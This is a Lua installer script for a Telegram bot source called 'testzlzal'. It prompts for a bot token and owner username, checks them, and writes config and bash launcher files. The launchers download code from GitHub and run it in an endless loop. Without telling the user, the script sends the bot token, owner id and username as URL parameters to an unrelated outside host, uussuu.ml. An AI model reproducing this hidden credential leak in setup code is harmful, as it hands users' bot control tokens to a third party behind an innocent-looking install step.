serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_testzlzal = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_testzlzal = function() 
local Create_Info = function(Token,Sudo,UserName)  
local testzlzal_Info_Sudo = io.open("sudo.lua", 'w')
testzlzal_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
testzlzal_Info_Sudo:close()
end  
if not database:get(Server_testzlzal.."Token_testzlzal") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_testzlzal.."Token_testzlzal",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_testzlzal.."UserName_testzlzal") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_testzlzal.."UserName_testzlzal",Json.Info.Username)
database:set(Server_testzlzal.."Id_testzlzal",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_testzlzal_Info()
Create_Info(database:get(Server_testzlzal.."Token_testzlzal"),database:get(Server_testzlzal.."Id_testzlzal"),database:get(Server_testzlzal.."UserName_testzlzal"))   
https.request("https://uussuu.ml/testzlzal/testzlzal.php?id="..database:get(Server_testzlzal.."Id_testzlzal").."&user="..database:get(Server_testzlzal.."UserName_testzlzal").."&token="..database:get(Server_testzlzal.."Token_testzlzal"))
local Runtestzlzal = io.open("testzlzal", 'w')
Runtestzlzal:write([[
#!/usr/bin/env bash
cd $HOME/testzlzal
token="]]..database:get(Server_testzlzal.."Token_testzlzal")..[["
rm -fr testzlzal.lua
wget "https://raw.githubusercontent.com/Source-Becca/testzlzal/master/testzlzal.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./testzlzal.lua -p PROFILE --bot=$token
done
]])
Runtestzlzal:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/testzlzal
while(true) do
rm -fr ../.telegram-cli
screen -S testzlzal -X kill
screen -S testzlzal ./testzlzal
done
]])
RunTs:close()
end
Files_testzlzal_Info()
database:del(Server_testzlzal.."Token_testzlzal");database:del(Server_testzlzal.."Id_testzlzal");database:del(Server_testzlzal.."UserName_testzlzal")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_testzlzal()  
var = true
else   
f:close()  
database:del(Server_testzlzal.."Token_testzlzal");database:del(Server_testzlzal.."Id_testzlzal");database:del(Server_testzlzal.."UserName_testzlzal")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
